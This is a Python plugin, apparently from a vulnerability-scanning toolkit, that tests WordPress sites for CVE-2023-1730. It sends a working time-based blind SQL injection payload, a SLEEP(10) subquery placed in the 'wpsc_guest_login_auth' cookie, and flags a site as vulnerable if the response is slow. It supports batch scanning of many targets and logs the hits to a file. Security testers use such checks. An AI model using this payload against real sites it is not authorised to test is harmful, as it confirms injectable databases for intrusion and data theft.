#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2023_1730:
    def get_url(self,input_url):
        try:
            url = input_url
            header = {
                "User-Agent": self.headers["User-Agent"],
                "Cookie": 'wpsc_guest_login_auth={"email":"\' AND (SELECT 42 FROM (SELECT(SLEEP(10)))NNTu)-- cLmu"}',
                "Accept-Encoding": "gzip",
            }
            s = time.time()
            req = requests.get(url,headers=header,proxies=self.proxy,verify=self.ssl)
            t = time.time()
            r = t - s
            if r > 10:
                OutPrintInfoSuc("WordPress", f'目标存在CVE-2023-1730 SQL漏洞: {url}')
                if not self.batch:
                    OutPrintInfo("WordPress", f'Poc\nCookie: {header.get("Cookie")}')
                else:
                    OutPutFile("wordpress_2023_1730.txt",f'目标存在CVE-2023-1730 SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("WordPress", f'目标不存在CVE-2023-1730 SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("WordPress",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("WordPress", '开始检测CVE-2023-1730 SQL漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("WordPress", 'CVE-2023-1730 SQL漏洞检测结束')

